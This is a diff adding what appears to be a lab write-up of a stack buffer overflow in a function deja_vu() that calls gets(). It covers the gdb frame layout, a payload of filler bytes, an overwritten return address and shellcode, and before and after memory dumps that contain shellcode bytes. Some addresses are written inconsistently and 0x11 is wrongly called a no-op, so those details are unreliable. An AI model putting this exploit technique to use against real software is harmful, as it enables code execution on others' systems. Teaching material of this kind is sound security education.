@@ -1,0 +1,28 @@
+The vulnerability in this question is a stack buffer overflow in the function deja_vu(). The call to gets(door) does not do bounds checking and allows us to overflow the buffer door[8]. An attacker could use this to write malicious shellcode to the system and alter the eip to point to it.
+
+I started by just writing the shellcode to the buffer and got a segmentation fault. Using gdb, I found that the shellcode was overwriting the return address. Because the shellcode was too long to fit before the eip, I decided to fill the bytes leading up to the eip with no-ops, overwrite the eip with the address of the beginning of the shellcode, and put the shellcode right after the eip.
+
+(gdb) info frame
+ ………
+ Saved registers:
+  ebp at 0xbffff768, eip at 0xbffff76c
+
+Using gdb, I found that the buffer started at 0xbfff758 and that the eip was stored at 0xbfff76c. This meant that I needed 20 no-ops to get to the eip and that the beginning of the shellcode was at 0xbfff770, right after the eip. I used \x11 as my no-op. I overwrote the eip with 0xbfff770 so that the next instruction pointed to the beginning of the shellcode to get the shellcode to run.
+
+In the end, I wrote to the buffer 20 no-ops, followed by the address of the beginning of the shellcode, followed by the shellcode in that order.
+
+before exploit
+(gdb) x/20x $esp
+0xbffff740:	0xb7fd23e4	0x0000000d	0x0804a000	0x08048492
+0xbffff750:	0x00000001	0xbffff814	0xbffff81c	0xb7e5f225
+0xbffff760:	0xb7fed270	0x00000000	0xbffff778	0x0804842a
+0xbffff770:	0x08048440	0x00000000	0x00000000	0xb7e454d3
+0xbffff780:	0x00000001	0xbffff814	0xbffff81c	0xb7fdc858
+
+after exploit
+(gdb) x/20x $esp
+0xbffff740:	0xbffff758	0x0000000d	0x0804a000	0x08048492
+0xbffff750:	0x00000001	0xbffff814	0x11111111	0x11111111
+0xbffff760:	0x11111111	0x11111111	0x11111111	0xbfff770
+0xbffff770:	0x895e1feb	0xc0310876	0x89074688	0x0bb00c46
+0xbffff780:	0x4e8df389	0x0c568d08	0xdb3180cd	0xcd40d889
